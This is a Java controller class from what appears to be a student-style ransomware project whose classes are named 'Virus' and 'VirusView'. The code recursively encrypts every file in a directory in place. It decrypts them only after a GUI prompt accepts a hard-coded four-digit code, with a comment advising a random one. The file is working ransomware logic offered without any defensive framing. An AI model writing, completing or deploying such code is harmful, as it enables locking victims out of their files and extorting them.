package Controller;

import Model.Virus;
import View.VirusView;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import javax.swing.JOptionPane;

public class VirusController {
    private Virus virus;
    private VirusView view;
    private static final String PASSWORD = "1234"; // Example: replace with your random 4-digit password

    public VirusController(Virus virus, VirusView view) {
        this.virus = virus;
        this.view = view;

        view.addDecryptListener(new DecryptListener());
    }

    public void encryptDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    encryptDirectory(file);
                } else {
                    encryptFile(file);
                }
            }
        }
    }

    private void encryptFile(File file) {
        try {
            byte[] fileData = Files.readAllBytes(file.toPath());
            byte[] encryptedData = virus.encrypt(fileData, virus.getSecretKey());
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(encryptedData);
            }
            System.out.println("Encrypted: " + file.getName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void decryptFile(File file) {
        try {
            byte[] fileData = Files.readAllBytes(file.toPath());
            byte[] decryptedData = virus.decrypt(fileData, virus.getSecretKey());
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(decryptedData);
            }
            System.out.println("Decrypted: " + file.getName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private class DecryptListener implements ActionListener {
        @Override
        public void actionPerformed(ActionEvent e) {
            String enteredCode = view.getDecryptionCode();
            if (PASSWORD.equals(enteredCode)) {
                File targetDir = new File("src/testdir");
                decryptDirectory(targetDir);
                view.showMessage("Files decrypted successfully!", "Success", JOptionPane.INFORMATION_MESSAGE);
                System.exit(0);
            } else {
                view.showMessage("Incorrect decryption code. Try again.", "Error", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    public void decryptDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    decryptDirectory(file);
                } else {
                    decryptFile(file);
                }
            }
        }
    }
}
